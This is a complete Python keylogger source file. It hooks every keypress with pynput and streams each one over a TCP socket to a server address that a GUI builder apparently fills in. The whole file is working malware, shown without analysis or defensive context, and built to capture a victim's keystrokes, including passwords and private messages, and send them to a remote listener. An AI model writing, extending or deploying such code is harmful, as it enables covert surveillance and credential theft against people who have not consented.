import socket
import sys
from pynput.keyboard import Listener, Key

def connect_to_server(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        return s
    except Exception as e:
        sys.stderr.write(f"Connection failed: {str(e)}\n")
        return None

def send_key(key, socket):
    try:
        if socket:
            socket.send(f"[{str(key)}]".encode('utf-8'))
    except Exception as e:
        sys.stderr.write(f"Send error: {str(e)}\n")

def on_press(key, socket):
    try:
        send_key(key.char, socket)
    except AttributeError:
        send_key(str(key), socket)

def on_release(key, socket):
    if key == Key.esc:
        return False
    return True

def run_keylogger():
    ip = "127.0.0.1"  # Will be replaced by GUI
    port = 2244       # Will be replaced by GUI
    sock = connect_to_server(ip, port)
    if sock:
        with Listener(
            on_press=lambda k: on_press(k, sock),
            on_release=lambda k: on_release(k, sock)
        ) as listener:
            listener.join()
        sock.close()

if __name__ == "__main__":
    run_keylogger()